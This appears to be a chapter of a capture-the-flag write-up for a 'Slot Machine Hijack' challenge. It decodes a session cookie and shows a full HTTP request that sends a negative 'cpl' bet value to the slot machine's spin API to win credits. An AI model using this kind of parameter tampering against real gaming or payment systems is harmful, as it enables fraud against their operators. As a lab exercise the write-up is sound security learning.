(ch4)=
Slot Machine Hijack
========================

goto [https://slots.jackfrosttower.com](https://slots.jackfrosttower.com)

Curiosly, there is a Cookie really intreaguing here, like:

```
XSRF-TOKEN: 
eyJpdiI6Ill3emgrYmUrZWk5K040Mloxd0QvNHc9PSIsInZhbHVlIjoicVN3YlUyaC9CY0JDSjlpWGwzVjRYbjJpWUFoTnlHanJKcmVPWTdXN0hmazBFRmUyQ3hPanYwNkxnSUhWdTNzUkRrVDgxeHZnN2ZtdjVyN0dOaVAzeDVuV00wcXErbXZMYy80WWFEd0NCVFBSblcya3dwb1cvcDZpSkpmRk9rS2YiLCJtYWMiOiI5MDYyZjlmM2FhMTY4MzkxODU0ZjRiZWExYTdhNjA3YmI0ZjQ2Yzk0ZGMwYThkZjk4ODhjNWY5MmYxNjQ0YjE2IiwidGFnIjoiIn0%3D
```
that decoded from base64:
```
{"iv":"Ywzh+be+ei9+N42Z1wD/4w==","value":"qSwbU2h/BcBCJ9iXl3V4Xn2iYAhNyGjrJreOY7W7Hfk0EFe2CxOjv06LgIHVu3sRDkT81xvg7fmv5r7GNiP3x5nWM0qq+mvLc/4YaDwCBTPRnW2kwpoW/p6iJJfFOkKf","mac":"9062f9f3aa168391854f4bea1a7a607bb4f46c94dc0a8df9888c5f92f1644b16","tag":"In0%3D
```
we have a lot of ingredients here, but we found a really easy way to win this challenge just by playing with it. 
<br/>
<br/>
Do you know that you can win a lot of credits just by using a negative value? 

```
POST /api/v1/02b05459-0d09-4881-8811-9a2a7e28fd45/spin HTTP/2
Host: slots.jackfrosttower.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://slots.jackfrosttower.com/uploads/games/frostyslots-206983/index.html
Content-Type: application/x-www-form-urlencoded
X-Ncash-Token: 8045060e-0cc9-4c7e-bb2e-e8a7c6171a2b
Origin: https://slots.jackfrosttower.com
Content-Length: 31
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

betamount=1&numline=20&cpl=-0.1
```
Done. 


(note: let's go on with the others challenges, the way is still so long and we want to send the full report at the deadline preview !!!) 
